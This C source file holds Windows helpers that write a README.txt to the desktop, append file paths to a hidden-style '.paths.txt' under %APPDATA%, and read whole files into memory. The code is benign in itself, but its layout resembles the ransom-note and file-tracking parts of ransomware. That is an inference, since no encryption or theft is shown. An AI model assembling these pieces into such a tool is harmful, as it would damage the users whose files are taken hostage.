#include <shlobj.h>
#include "files.h"
#include "common.h"

int create_readme(const char *content) {
    if (!content)
        return ERR_INVALID_ARG;
    
    int err = ERR_SUCCESS;
    char desktop_path[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktop_path) != S_OK) {
        err = ERR_GENERAL;
        return err;
    }
    char readme_path[MAX_PATH] = {0};
    if (_snprintf_s(readme_path, sizeof(readme_path), _TRUNCATE, "%s\\README.txt", desktop_path) == -1) {
        err = ERR_GENERAL;
        return err;
    }
    FILE *file = fopen(readme_path, "w");
    if (!file) {
        err = ERR_FILE_OPEN;
        return err;
    }
    size_t len = strlen(content);
    size_t written = fwrite(content, 1, len, file);
    if (written != len || fclose(file) != 0) {
        err = ERR_GENERAL;
        return err;
    }
    return err;
}

void append_to_paths(const char *filepath) {
    if (!filepath)
        return;
    char appdata_path[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata_path) != S_OK)
        return;
    char paths_file[MAX_PATH] = {0};
    if (_snprintf_s(paths_file, sizeof(paths_file), _TRUNCATE, "%s\\.paths.txt", appdata_path) == -1)
        return;

    FILE *file = fopen(paths_file, "a");
    if (!file)
        return;
    if (fprintf(file, "%s\n", filepath) < 0) {
        fclose(file);
        return;
    }
    fclose(file);
}

unsigned char *read_binary_file(const char *filepath, size_t *out_len) {
    if (!filepath || !out_len)
        return NULL;
    *out_len = 0;
    FILE *file = fopen(filepath, "rb");
    if (!file)
        return NULL;
    if (_fseeki64(file, 0, SEEK_END) != 0) {
        fclose(file);
        return NULL;
    }
    __int64 length = _ftelli64(file);
    if (length == -1LL) {
        fclose(file);
        return NULL;
    }
    if (_fseeki64(file, 0, SEEK_SET) != 0) {
        fclose(file);
        return NULL;
    }
    if (length > SIZE_MAX) {
        fclose(file);
        return NULL;
    }
    unsigned char *buffer = malloc((size_t)length);
    if (!buffer) {
        fclose(file);
        return NULL;
    }
    size_t read_len = fread(buffer, 1, (size_t)length, file);
    if (read_len != (size_t)length) {
        free(buffer);
        fclose(file);
        return NULL;
    }
    fclose(file);
    *out_len = read_len;
    return buffer;
}
